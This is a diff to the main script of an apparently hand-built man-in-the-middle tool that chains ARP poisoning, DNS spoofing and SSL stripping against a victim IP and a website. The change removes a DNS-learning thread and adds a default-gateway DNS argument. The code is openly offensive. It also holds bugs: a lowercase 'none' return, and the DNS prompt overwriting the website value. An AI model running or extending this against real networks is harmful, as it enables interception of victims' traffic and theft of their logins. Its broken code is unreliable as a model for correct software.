@@ -1,6 +1,5 @@
 from arp_poisoning import ARPPoison
 from dns_spoofing import DNSSpoof
-from dns_learner import DNSLearner
 from ssl_stripping import SSLStrip
 
 import argparse
@@ -10,6 +9,16 @@ import logging
 import threading
 import time
 import nmap
+import netifaces
+
+def get_default_gateway(iface):
+    gateways = netifaces.gateways()
+
+    for gateway, interface, *_ in gateways.get(netifaces.AF_INET, []):
+        if iface == interface:
+            return gateway
+
+    return none
 
 def parse_args():
     parser = argparse.ArgumentParser(
@@ -38,6 +47,13 @@ def parse_args():
     parser.add_argument(
         "-w", "--website",
         help="Website IP address"
+    )
+
+    default_gateway = get_default_gateway(default_interface)
+    parser.add_argument(
+        "-d", "--dns",
+        default=default_gateway,
+        help=f"DNS server IP address (default: {default_gateway})"
     )
 
     parser.add_argument(
@@ -80,6 +96,7 @@ def setup():
 
         args.target = input("> Victim IP address: ").strip()
         args.website = input("> Website IP address: ").strip()
+        args.website = input("> DNS server IP address: ").strip()
         args.aggressiveness = int(input("> Aggressiveness (1-10): ").strip())
 
         if not 1 <= args.aggressiveness <= 10:
@@ -90,42 +107,37 @@ def setup():
         args.interface,
         args.target,
         args.website,
+        args.dns,
         args.aggressiveness
     )
 
-def run(iface, victim, site, timer):
+def run(iface, victim, website, dns, timer):
     stop_event = threading.Event()
 
     # Poison ARP in a separate thread (to maintain MitM position)
-    arp = ARPPoison(iface, victim, site)
+    arp = ARPPoison(iface, victim, website)
     arp_thread = threading.Thread(
         target=arp.attack,
         args=(timer, stop_event,)
     )
 
-    # Learn DNS in a separate thread
-    dns_learner = DNSLearner(iface, arp)
-    dns_learn_thread = threading.Thread(
-        target=dns_learner.start,
-        args=(stop_event,)
-    )
-
     # Spoof DNS in a separate thread
-    dns_spoofer = DNSSpoof(iface, victim, site)
+    dns_spoofer = DNSSpoof(iface, victim, website)
     dns_sniff_thread = threading.Thread(
         target=dns_spoofer.start,
         args=(stop_event,)
     )
 
     # Strip SSL in a separate thread
-    ssl_stripper = SSLStrip(iface, victim, site)
+    ssl_stripper = SSLStrip(iface, victim, website)
     ssl_thread = threading.Thread(
         target=ssl_stripper.start,
         args=(stop_event,)
     )
 
+    arp.set_dns(dns)
+
     arp_thread.start()
-    dns_learn_thread.start()
     dns_sniff_thread.start()
     ssl_thread.start()
 
@@ -139,7 +151,6 @@ def run(iface, victim, site, timer):
         print("\nAttack is being cancelled. Please wait...")
 
         arp_thread.join()
-        dns_learn_thread.join()
         dns_sniff_thread.join()
         ssl_thread.join()
 
@@ -162,5 +173,5 @@ if __name__ == "__main__":
     scapy.conf.verb = 0
     logging.getLogger("scapy").setLevel(logging.ERROR)
 
-    iface, victim, site, timer = setup()
-    run(iface, victim, site, timer)
+    iface, victim, website, dns, timer = setup()
+    run(iface, victim, website, dns, timer)
